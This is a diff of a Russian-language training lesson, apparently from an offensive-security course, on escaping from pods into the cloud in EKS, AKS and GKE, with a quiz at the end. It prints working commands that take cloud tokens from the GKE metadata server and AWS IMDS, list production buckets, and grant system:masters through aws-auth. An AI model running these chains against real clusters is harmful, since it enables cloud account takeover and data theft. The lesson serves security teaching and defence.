@@ -15,205 +15,153 @@ estimated_minutes: 40
 summary: "Специфика managed-Kubernetes: EKS (IRSA), AKS (workload identity), GKE (workload identity). Как k8s-доступ превращается в облачные права и как атаковать control plane."
 ---
 
-## Зачем этот урок
+## Задача
 
-Managed-кластеры (EKS, AKS, GKE) скрывают control plane, но добавляют **связь между k8s-идентичностями и облачными ролями**. Именно эта связь — главный приз: из пода можно получить облачные права и выйти за пределы кластера в аккаунт.
+До этого мы работали с «голым» Kubernetes. В реальности кластеры чаще **managed**: EKS у AWS, AKS у Azure, GKE у Google. Владелец не управляет control plane — за него это делает облако. Но взамен появляется то, ради чего мы вообще зашли: **связь между идентичностью пода в Kubernetes и правами в облачном аккаунте**.
 
-## EKS (AWS)
+Цель урока: понять, как из пода managed-кластера выйти в облако, и в чём разница трёх платформ.
 
-- **Control plane** управляется AWS, но **worker nodes** — ваши EC2.
-- **IRSA (IAM Roles for Service Accounts)** — привязка k8s SA к IAM-роли через OIDC.
-- **aws-auth ConfigMap** — маппинг IAM-принципалов на k8s RBAC.
+## Данные, с которыми работаем
 
-Связь SA ↔ IAM-роль:
+Мы в поде **GKE**. В прошлых уроках мы видели, что под аутентифицируется перед кластером через SA-токен. Но GKE добавляет второй, куда более интересный канал: **metadata-сервер**. Это локальный сервис, который под может спросить «какие у меня облачные креды?».
 
-```bash
-# В поде с IRSA: переменные и токен
-env | grep -i AWS_ROLE_ARN
-cat $AWS_WEB_IDENTITY_TOKEN_FILE
-# Креды приходят от STS AssumeRoleWithWebIdentity
-aws sts get-caller-identity
-```
-
-Атаки:
-
-- **Захват SA с IRSA** → получение IAM-роли.
-- **Чтение/изменение `aws-auth`** (нужны права на ConfigMap) → выдать себе `system:masters`.
-- **Node IAM role**: если узлы имеют широкую роль, побег на узел даёт её креды (IMDS).
+Сначала узнаём, за какой аккаунт мы выступаем:
 
 ```bash
-# На узле EKS — креды node role через IMDS
-curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+$ curl -s -H "Metadata-Flavor: Google" \
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
+1234567890-compute@developer.gserviceaccount.com
 ```
 
-## AKS (Azure)
+`Metadata-Flavor: Google` — обязательный заголовок, которым GKE защищает metadata-сервер от простого SSRF. Мы его знаем, поэтому отвечаем правильно.
 
-- **Control plane** — бесплатный/managed; nodes — Azure VMSS.
-- **Workload Identity** — привязка k8s SA к Azure managed identity/user-assigned identity через OIDC federation.
-- **Kubelet identity** — используется для pull образов и управления ресурсами.
+## Шаг 1: получаем облачный токен
 
-Связь SA ↔ Azure identity:
+Просим у metadata-сервера **access token** — временный ключ доступа к GCP API:
 
 ```bash
-# В поде: токен projected SA и федерация
-ls /var/run/secrets/azure/tokens/
-cat /var/run/secrets/azure/tokens/azure-identity-token
-# Обмен на токен Azure AD через OIDC
+$ TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
+    | jq -r .access_token)
+$ echo ${TOKEN:0:20}...
+ya29.c.b0Aa...
 ```
 
-Атаки:
+Это стандартный OAuth-токен GCP. Теперь мы — не «под», а **сервисный аккаунт GCP**, и можем звать облачные API.
 
-- **Захват SA с workload identity** → токен Azure.
-- **Kubelet identity** на узле → права на ACR, VMSS.
-- **`az aks get-credentials`** при наличии прав → доступ к API кластера.
+## Шаг 2: выясняем, что нам разрешено
 
-## GKE (GCP)
-
-- **Workload Identity** — привязка k8s SA к GCP service account.
-- **Node service account** — используется узлами.
-- **GKE metadata server** — поды без Workload Identity получают node SA по умолчанию (риск!).
-
-Связь:
+Токен есть — надо понять его вес. Начинаем с самого информативного: какие проекты видны.
 
 ```bash
-# В поде с Workload Identity
-curl -s -H "Metadata-Flavor: Google" \
-  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
-# Возвращает токен GCP SA, привязанного к k8s SA
+$ curl -s -H "Authorization: Bearer $TOKEN" \
+    "https://cloudresourcemanager.googleapis.com/v1/projects" | jq -r '.projects[].projectId'
+acme-prod
+acme-data
 ```
 
-Атаки:
-
-- **Поды без Workload Identity используют node SA** — часто широкие права.
-- **Аннотация `iam.gke.io/gcp-service-account`** при праве создавать SA/поды → привязка к привилегированному GCP SA.
-- **Захват `roles/container.admin`** → полный контроль кластера.
-
-## Разобранный пример: GKE pod → GCP project
-
-1. Мы в поде GKE. Проверяем metadata:
-   ```bash
-   curl -s -H "Metadata-Flavor: Google" \
-     "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
-   ```
-2. Получаем токен:
-   ```bash
-   TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
-     "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
-   ```
-3. Определяем права SA:
-   ```bash
-   curl -s -H "Authorization: Bearer $TOKEN" \
-     "https://cloudresourcemanager.googleapis.com/v1/projects"
-   ```
-4. Если SA имеет доступ к GCS/секретам — читаем данные:
-   ```bash
-   gcloud storage ls --access-token-file=<(echo "$TOKEN") 2>/dev/null || \
-   curl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b?project=<PROJ>"
-   ```
-5. Если SA — `roles/container.admin`, создаём привилегированный под или меняем RBAC кластера.
-
-## Общее: escape из кластера в облако
-
-Ключевая идея — найти **мост** между k8s и облаком:
-
-| Платформа | Мост |
-|-----------|------|
-| EKS | IRSA (SA→IAM role), node IAM role, aws-auth |
-| AKS | workload identity, kubelet identity |
-| GKE | workload identity, node SA |
-
-Ищите в подах: env с `AWS_ROLE_ARN`, `/var/run/secrets/azure/tokens`, GCP metadata. Затем — стандартная облачная эскалация.
-
-## Частые ошибки
-
-- **Считать managed = безопасный.** Control plane скрыт, но data plane — ваш.
-- **Не проверять node role/SA.** Поды без workload identity часто используют широкую node-идентичность.
-- **Игнорировать `aws-auth`/RBAC.** Изменение маппинга = `system:masters`.
-- **Забыть про pull-секреты.** `imagePullSecrets` могут содержать креды registry.
-- **Не смотреть ACR/ECR/GCR.** Права kubelet identity часто включают registry.
-
-## Сравнение managed-кластеров
-
-| Аспект | EKS | AKS | GKE |
-|--------|-----|-----|-----|
-| Идентичность пода | IRSA (OIDC) | Workload Identity | Workload Identity |
-| Metadata | IMDS (169.254.169.254) | IMDS Azure | metadata.google.internal |
-| Control plane | управляемый AWS | управляемый Azure | управляемый Google |
-| Доступ к API | aws-auth ConfigMap | Azure RBAC | GCP IAM |
-| Аудит | CloudTrail + audit | Azure Monitor | Cloud Audit Logs |
-| Секреты | EKS secrets (KMS) | Key Vault CSI | Secret Manager CSI |
-
-Общее: managed-кластер не отменяет конфигурацию узлов и RBAC; большинство побегов идут через pod → node → облачные креды.
-
-## Детали IRSA и Workload Identity
-
-EKS: SA в namespace связан с IAM-ролью через OIDC-провайдер. Токен проецируется в под и обменивается на AWS-креды:
+Видим два проекта. Проверяем доступ к хранилищу:
 
 ```bash
-TOKEN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
-aws sts assume-role-with-web-identity \
-  --role-arn arn:aws:iam::111122223333:role/EksPodRole \
-  --role-session-name pod --web-identity-token "$TOKEN"
+$ curl -s -H "Authorization: Bearer $TOKEN" \
+    "https://storage.googleapis.com/storage/v1/b?project=acme-prod" | jq -r '.items[].name'
+acme-prod-backups
+acme-prod-assets
 ```
 
-GKE: аннотация `iam.gke.io/gcp-service-account`; токен берётся с metadata-сервера GKE. AKS: federated credential связывает K8s SA с Azure managed identity.
+Мы читаем **бакеты прода**. Один под без единого эксплойта — только потому, что поду доверили облачную роль. Именно эту связь называют **Workload Identity** (GKE) / **IRSA** (EKS) / workload identity federation (AKS).
 
-## Инструменты
+## Шаг 3: как эта связь устроена и где её слабое место
+
+Механика во всех трёх облаках похожа: k8s service account **аннотируется** облачной ролью, облако доверяет кластеру через OIDC-провайдера, а под обменивает свой k8s-токен на облачные креды.
+
+В GKE аннотация выглядит так:
+
+```yaml
+metadata:
+  annotations:
+    iam.gke.io/gcp-service-account: app-prod@acme-prod.iam.gserviceaccount.com
+```
+
+Слабое место — **условие доверия (trust policy)**. Если в нём указан wildcard вместо конкретного `namespace:serviceaccount`, то **любой** под кластера может встать на эту роль. В EKS это выглядит как `sub` вида `system:serviceaccount:*:*` в trust-политике IAM-роли:
 
 ```bash
-aws eks list-clusters
-aws eks describe-cluster --name prod --query 'cluster.{version:version,ep:endpoint,oidc:identity.oidc.issuer}'
-az aks list -o table
-gcloud container clusters list
-kubectl config get-contexts
-kube-bench run --targets=node
+$ aws iam get-role --role-name EksPodRole \
+    --query 'Role.AssumeRolePolicyDocument.Statement[0].Condition'
+{
+  "StringEquals": { "oidc.eks...:sub": "system:serviceaccount:*:*" }
+}
 ```
 
-## Разобранный пример 2: EKS pod → AWS
+`*:*` вместо `prod:app` — и роль доступна всем подам. Это классический мисконфиг managed-кластеров.
 
-1. В поде читаем projected-токен IRSA.
-2. `assume-role-with-web-identity` → временные AWS-креды.
-3. `aws sts get-caller-identity` → роль пода.
-4. `enumerate-iam` → ищем эскалацию (часто роль имеет доступ к S3/Secrets).
-5. Через найденные права двигаемся в аккаунт.
+## Другой канал: node SA и креды узла
 
-## Частые мисконфиги идентичности
-
-- **IRSA trust с wildcard в `sub`** — любой SA кластера может встать на роль.
-- **Node role с широкими правами** — компрометация узла = доступ ко всему.
-- **`aws-auth` ConfigMap с лишними маппингами** — сторонние пользователи получают `system:masters`.
-- **AKS без Azure RBAC для Kubernetes** — локальные аккаунты и сертификаты.
-- **GKE без Workload Identity** — поды используют node SA (часто editor).
-
-Проверка `aws-auth`:
-```bash
-kubectl -n kube-system get configmap aws-auth -o yaml
-```
-
-## Практическое задание
-
-Разверните kind-кластер и настройте IRSA-подобную привязку (можно эмулировать через проекцию токена). Покажите, что под читает токен и обменивает его на креды. Затем ограничьте `sub` в trust-политике до конкретного namespace/SA и убедитесь, что другой SA больше не может встать. Это ключевой навык защиты managed-кластеров.
-
-## Аудит aws-auth и локальных аккаунтов AKS
+Workload Identity может быть не настроен вовсе — тогда под наследует **node service account**: облачную роль самой ноды. Часто она широкая (`editor` в GKE, широкая IAM-роль в EKS).
 
 ```bash
-kubectl -n kube-system get configmap aws-auth -o yaml
-az aks show -g rg -n cluster --query 'disableLocalAccounts'
+# GKE под без Workload Identity — тот же metadata-сервер, но аккаунт node
+$ curl -s -H "Metadata-Flavor: Google" \
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
+gke-prod-node@acme-prod.iam.gserviceaccount.com
 ```
 
-Если в `aws-auth` есть лишние маппинги к `system:masters`, сторонний IAM-пользователь получит админ-доступ к кластеру. В AKS `disableLocalAccounts=false` оставляет локальные сертификаты/ключи — их утечка даёт доступ в обход Azure RBAC. Оба — частые мисконфиги managed-кластеров.
-
-## Быстрая проверка
+В EKS узел — это EC2-инстанс, и его креды лежат в **IMDS** (`169.254.169.254`) — сервисе метаданных AWS:
 
 ```bash
-kubectl -n kube-system get configmap aws-auth -o yaml
-az aks show -g rg -n cluster --query disableLocalAccounts
-gcloud container clusters describe prod --format=json | jq '.workloadIdentityConfig'
+$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+eks-node-role
 ```
 
-Лишние маппинги в aws-auth, локальные аккаунты AKS и отсутствие Workload Identity в GKE — три частые дыры managed-кластеров.
+Побег на узел (из прошлых уроков) даёт именно эти креды. Поэтому цепочка «под → узел → node role → аккаунт» — самый частый путь в managed-кластерах.
+
+## Полный прогон от начала до конца
+
+1. Зашли в под GKE, спросили metadata-сервер про аккаунт.
+2. Получили access token сервисного аккаунта.
+3. Перечислили проекты → нашли `acme-prod` и `acme-data`.
+4. Прочитали бакеты прода через storage API.
+5. Проверили бы trust-политику с wildcard — тогда на роль встанет любой под.
+
+Один под → данные прода. Никаких CVE: только неверно выданное доверие.
+
+## Если не сработало: специфика платформ
+
+| Платформа | Мост k8s → облако | Что искать в поде |
+|-----------|-------------------|-------------------|
+| EKS | IRSA (SA → IAM role), node role, `aws-auth` | `AWS_ROLE_ARN`, `/var/run/secrets/eks.amazonaws.com/...`, IMDS |
+| AKS | workload identity, kubelet identity | `/var/run/secrets/azure/tokens/azure-identity-token` |
+| GKE | Workload Identity, node SA | `metadata.google.internal`, аннотация `iam.gke.io/...` |
+
+Отдельно на EKS стоит проверить **`aws-auth` ConfigMap** — маппинг IAM-принципалов на k8s RBAC. Если у тебя есть права на его изменение, можно выдать себе `system:masters` (полные права в кластере):
+
+```bash
+$ kubectl -n kube-system get configmap aws-auth -o yaml | grep -A3 mapUsers
+- userarn: arn:aws:iam::111122223333:user/ci-bot
+  username: ci-bot
+  groups: [system:masters]
+```
+
+В AKS аналогичная дыра — **локальные аккаунты** (`disableLocalAccounts=false`): их сертификаты/ключи дают доступ в обход Azure RBAC. В GKE — поды без Workload Identity, использующие node SA.
+
+## Что мы теперь знаем
+
+- Managed-кластер скрывает control plane, но **data plane — твой**: узлы и поды под твоим контролем.
+- Workload Identity / IRSA связывает k8s SA с облачной ролью через OIDC.
+- Wildcard в trust-политике (`sub: system:serviceaccount:*:*`) позволяет любому поду встать на роль.
+- Без Workload Identity под наследует **node SA** — часто широкий.
+- На EKS `aws-auth` ConfigMap может дать `system:masters`; на AKS — локальные аккаунты.
+- Путь в облако почти всегда: под → узел → креды узла → аккаунт.
+
+## На что смотреть дальше
+
+- **k8s-image-supply-chain**: как через образ попасть на узлы managed-кластера.
+- **runc-escape-deep**: побег на уровне рантайма, мимо admission и RBAC.
+- **cloud-privesc-iam**: что делать с полученной облачной ролью дальше.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Что такое IRSA в EKS?"
@@ -237,7 +185,7 @@ gcloud container clusters describe prod --format=json | jq '.workloadIdentityCon
     - "Они не запускаются"
     - "Они используют node service account, который часто имеет широкие права"
     - "Они шифруют данные"
-    - "Они медленнее"
+    - "Они работают медленнее"
   answer: 1
   explanation: "Без Workload Identity под наследует node SA — частый путь к GCP-правам."
 - question: "Что искать в поде для связи с облаком на Azure?"
@@ -255,8 +203,12 @@ gcloud container clusters describe prod --format=json | jq '.workloadIdentityCon
     - "Оно удаляет поды"
     - "Оно отключает сеть"
   answer: 1
-  explanation: "Маппинг IAM→system:masters даёт административный доступ к кластеру."
+  explanation: "Маппинг IAM в system:masters даёт административный доступ к кластеру."
 ```
+
+## Куда дальше
+
+В следующем уроке мы займёмся **kubelet API** — агентом на каждой ноде, который часто слушает порт 10250 без должной авторизации и умеет выполнять команды в подах. А пока главное запомни: **в managed-кластере главный приз — не сам кластер, а мост в облако**, и держится он на trust-политике, которую часто пишут слишком широко.
 
 ## Где пригодится
 
